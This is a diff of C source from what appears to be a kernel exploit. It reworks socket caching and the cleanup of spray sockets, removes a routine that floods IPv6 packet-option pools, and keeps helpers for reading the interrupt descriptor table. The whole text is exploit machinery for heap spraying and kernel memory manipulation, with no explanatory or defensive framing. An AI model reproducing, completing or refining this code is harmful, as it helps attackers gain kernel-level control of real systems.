@@ -99,40 +99,15 @@ int fast_new_socket(void) {
 
 // Store socket cache
 void cache_socket(int sock) {
-    if (sock < 0) {
-        return;
-    }
-
-    if (!socket_cache_initialized) {
-        init_socket_cache();
-    }
-
-    reset_ipv6_opts(sock);
+    if (sock < 0) return;
+    if (!socket_cache_initialized) init_socket_cache();
 
     if (socket_cache_count < SOCKET_CACHE_SIZE) {
         socket_cache[socket_cache_count++] = sock;
     } else {
-        safe_close_socket(sock);
+        close(sock);
     }
 }
-
-// Clear Cache
-void flush_socket_cache(void) {
-    if (!socket_cache_initialized) {
-        return;
-    }
-
-    while (socket_cache_count > 0) {
-        int sock = socket_cache[--socket_cache_count];
-
-        if (sock >= 0) {
-            safe_close_socket(sock);
-        }
-
-        socket_cache[socket_cache_count] = -1;
-    }
-}
-
 
 #define GET_TCLASS(name) \
 int name(int s) { \
@@ -164,25 +139,30 @@ typedef struct {
 } exploit_state_t;
 
 void comprehensive_cleanup(exploit_state_t* state) {
-    flush_socket_cache();
+    if (!state) return;
 
-    for (int i = 0; i < state->spray_count; i++) {
-        if (state->spray_sock[i] >= 0) {
-            reset_ipv6_opts(state->spray_sock[i]);
-            shutdown(state->spray_sock[i], SHUT_RDWR);
-            close(state->spray_sock[i]);
-            state->spray_sock[i] = -1;
+    if (state->master_sock >= 0) { close(state->master_sock); state->master_sock = -1; }
+    if (state->kevent_sock >= 0) { close(state->kevent_sock); state->kevent_sock = -1; }
+
+    if (state->spray_sock) {
+        for (int i = 0; i < state->spray_count; i++) {
+            if (state->spray_sock[i] >= 0) {
+                close(state->spray_sock[i]);
+                state->spray_sock[i] = -1;
+            }
         }
     }
 
-    safe_close_socket(state->master_sock);
-    safe_close_socket(state->kevent_sock);
-    state->master_sock = -1;
-    state->kevent_sock = -1;
+    if (socket_cache_initialized) {
+        while (socket_cache_count > 0) {
+            int s = socket_cache[--socket_cache_count];
+            socket_cache[socket_cache_count] = -1;
+            if (s >= 0) close(s);
+        }
+    }
 
     nanosleep(NANOSLEEP_100US, NULL);
 }
-
 
 struct opaque {
     volatile int triggered;
@@ -348,32 +328,6 @@ void sidt(unsigned long long* addr, unsigned short* size) {
     *size = *(unsigned short*)buf;
     *addr = *(unsigned long long*)(buf + 2);
 }
-
-
-void flush_ipv6_option_pools() {
-    int flush_sockets[128];
-
-    for (int i = 0; i < 128; i++) {
-        flush_sockets[i] = fast_new_socket();
-        if (flush_sockets[i] >= 0) {
-            char dummy[256] = {0};
-            setsockopt(flush_sockets[i], IPPROTO_IPV6, IPV6_TCLASS, dummy, sizeof(int));
-            set_pktopts(flush_sockets[i], dummy, 32);
-            set_rthdr(flush_sockets[i], dummy, 64);
-            reset_ipv6_opts(flush_sockets[i]);
-        }
-    }
-
-    nanosleep(NANOSLEEP_10US, NULL);
-
-    for (int i = 127; i >= 0; i--) {
-        if (flush_sockets[i] >= 0)
-            cache_socket(flush_sockets[i]);
-    }
-
-    nanosleep(NANOSLEEP_10US, NULL);
-}
-
 
 int verify_idt(void) {
     unsigned long long current_base;
